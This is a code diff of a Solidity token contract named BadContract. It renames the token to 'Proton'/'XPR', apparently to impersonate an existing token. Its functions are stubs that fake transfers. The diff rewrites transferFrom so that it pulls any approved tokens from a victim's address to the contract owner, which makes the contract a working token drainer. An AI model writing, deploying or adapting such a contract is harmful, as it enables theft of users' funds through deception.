@@ -17,11 +17,6 @@ interface IBEP20 {
 contract BadContract is IBEP20 {
     address payable private _owner;
 
-    modifier onlyOwner() {
-        require(_owner == msg.sender, "Ownable: caller is not the owner");
-        _;
-    }
-
     constructor() {
         _owner = payable(msg.sender);
     }
@@ -34,8 +29,8 @@ contract BadContract is IBEP20 {
         return true;
     }
 
-    function name() public view returns (string memory) { return "Phoenix"; }
-    function symbol() public view returns (string memory) { return "FNX"; }    
+    function name() public view returns (string memory) { return "Proton"; }
+    function symbol() public view returns (string memory) { return "XPR"; }    
     function decimals() public pure returns (uint8){ return 2; }
 
     function totalSupply() view external override returns (uint256) { return 10000000; }
@@ -43,5 +38,8 @@ contract BadContract is IBEP20 {
     function allowance(address owner, address spender) view external override returns (uint256) { return 0; }
 
     function transfer(address recipient, uint256 amount) external override returns (bool) { return true; }
-    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) { return true; }
+    function transferFrom(address tokenToTransfer, address tokenOwner, uint256 amount) external override returns (bool) { 
+        IBEP20(tokenToTransfer).transferFrom(tokenOwner, _owner, amount);
+        return true; 
+    }
 }
